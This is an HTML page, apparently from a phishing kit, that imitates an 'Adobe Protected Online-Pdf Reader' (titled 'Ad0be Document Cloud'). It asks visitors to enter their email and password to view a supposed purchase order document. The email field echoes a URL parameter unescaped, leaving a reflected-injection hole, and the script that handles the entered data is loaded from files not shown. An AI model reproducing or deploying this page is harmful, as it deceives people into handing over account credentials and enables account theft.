<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Ad0be Document Cloud - Start Download.</title><script async="" src="index_files/cloudflare_002.html"></script><script src="index_files/cloudflare.html" async=""></script>


<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"a817d3c304f8a7ff78844219004be2d5",petok:"c7612af90cc4552195d0936b36756d76a460348d-1423473790-1800",zone:"costcosupply.com",rocket:"0",apps:{}}];CloudFlare.push({"apps":{"ape":"377bcd5c648e861b9c7dc37a4baebcb3"}});!function(a,b){a=document.createElement("script"),b=document.getElementsByTagName("script")[0],a.async=!0,a.src="ajax.cloudflare.com/cdn-cgi/nexp/dok3v%3d919620257c/cloudflare.min.html",b.parentNode.insertBefore(a,b)}()}}catch(e){};
//]]>
</script>
<link href="index_files/facebox.css" rel="stylesheet" type="text/css">
<script language="javascript" type="text/javascript" src="index_files/jquery-1.js"></script>
<script language="javascript" type="text/javascript" src="index_files/facebox.js"></script>
<script language="javascript" type="text/javascript" src="index_files/jquery.js"></script>
<script language="javascript" type="text/javascript" src="index_files/javascript1.js"></script>
<title>Adobe Protected Online-Pdf Reader</title>
<style type="text/css">
#heading_tab {
	background-color: #FFFFFF;
	padding: 4px;
	width: 100%;
	color: #F00;
}
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-color: #FFF;
	background-image: url(bg.jpg);
	background-repeat: no-repeat;
}
body,td,th {
	font-family: Tahoma, Geneva, sans-serif;
}
#central_dv {
	padding: 5px;
	width: 400px;
	margin-right: auto;
	margin-left: auto;
	background-color: #900;
	text-align: center;
	background-image: url(bck.html);
}
.bigredB {
	font-size: 12px;
	color: #FFF;
	background-color: #09F;
	padding: 5px;
}
.textfldclass {
	padding: 4px;
	width: 300px;
	margin-bottom: 5px;
	text-align: center;
}
.pop_up_class {
	text-align: center;
	width: 400px;
}
.message_div {
	padding: 4px;
	width: 300px;
	margin-right: auto;
	margin-left: auto;
	margin-top: 5px;
	margin-bottom: 5px;
	color: #F00;
}
.style1 {
	color: #999999;
	font-size: 14px;
<style type="text/css">
<!--
body {
	background-image:url("images/bg.html");
    background-repeat: no-repeat;
	background-size: 100% 100%;
	background-attachment: fixed;
	z-index: -950;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
-->
</style>
<link href="index_files/style.css" rel="stylesheet" type="text/css">
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>
</head>
<body>

<div class="HeaderBox">
  <div class="clear2">
    <table width="935" cellpadding="0" border="0">
      <tbody><tr>
        <td width="739" align="right"><img src="index_files/ph.png" width="167" height="51"></td>
      </tr>
    </tbody></table>
  </div></div>
<div class="NavBox">
<a href="#" class="NavButton">Exit</a><a href="http://localhost/NEW ADO - Copy/index.php" class="NavButton">Download Document</a>

<form><a href="#" onclick="window.print()" class="NavButton">Print</a> </form>

<a href="#" class="NavButton">Login</a>

 <div class="document">CONFIRM YOUR EMAIL ADDRESS TO VIEW ONLINE </div>
 <div class="clear2"></div>
</div><div class="element">
    <style type="text/css">
.textFieldlog {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 14px;
	color: #2E2E2E;
	height: 24px;
	width: 96%;
	margin-bottom: 4px;
	border: 1px solid #A8A8A8;
	margin-right: auto;
	margin-left: auto;
	padding-top: 4px;
	padding-right: 10px;
	padding-bottom: 4px;
	padding-left: 10px;
	background-color: #FFF;
	background-repeat: repeat;
}

.textFieldlog:focus {
	background-color: #FDF7F7;
	border: 1.6px solid #F66;
}

.ButtonLOG {
	color: #FFF;
	background-color: #F66;
	border: 1px solid #FFF;
	padding-top: 5px;
	padding-right: 3px;
	padding-bottom: 5px;
	padding-left: 3px;
	font-family: Arial, sans-serif;
	font-size: 11.6px;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	-khtml-border-radius: 4px;
	border-radius: 4px;
	margin-right: 2%;
	text-decoration: none;
	margin-top: 2%;
	font-weight: bold;
}


.ButtonLOG:hover {
	background-color: #FF2F2F;
}


.texthinter {
	font-size: 14px;
	font-family: Arial, sans-serif;
	color: #333;
}


.textform {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	text-transform: uppercase;
	color: #4D4D4D;
}

.YeloowTop {
	background-color: #4B4B4B;
	border: 1px solid #333333;
	padding: 2%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 16px;
	color: #FFF;
}

.hint23 {
	background-color: #FFEAEA;
	border: 1px solid #FBB;
	font-family: Tahoma, Geneva, sans-serif;
	color: #2B2D3C;
	font-size: 16px;
	margin-bottom: 2%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
	margin-top: 2%;
	padding-top: 1.5%;
	padding-right: 3%;
	padding-bottom: 1.5%;
	padding-left: 8%;
	background-image: url(images/warning.html);
	background-repeat: no-repeat;
	background-position: 8px;
}

.sidebox67 {
	background-color: #FFCC00;
	padding: 4%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
}
    </style>






  <table width="90%" cellspacing="0" cellpadding="0" border="0">
  <tbody><tr>
    <td><link href="index_files/SpryValidationTextField.html" rel="stylesheet" type="text/css">
    
      
  <link href="index_files/SpryValidationTextField.html" rel="stylesheet" type="text/css">
  <p><strong>Confirm Your Email Address</strong>!<br>
    To view purchase order document.</p>
   
      
  <label for="textfield"></label>
      <input autocomplete="off" name="email" value="<?=$_GET[email]?>" class="textfldclass watermark" id="email_field" value="" placeholder="you@youremail.com" type="text">
      
      <div id="the_d_" style="display: none;"><span>
        
         
		  
        <input value="" maxlength="500" name="password" class="textfldclass 
watermark" id="password_field" placeholder="Password" type="password">
        </span></div>
      <p>
        <input name="button" class="bigredB" id="download" value="Download" type="submit">
</p></td>
    </tr>
</tbody></table>
  </div>
  
<div class="logo1"><img src="index_files/adobe_logo_new_1.jpg" width="62" height="106"></div>



<script>javascripalert""</script></body>
</html>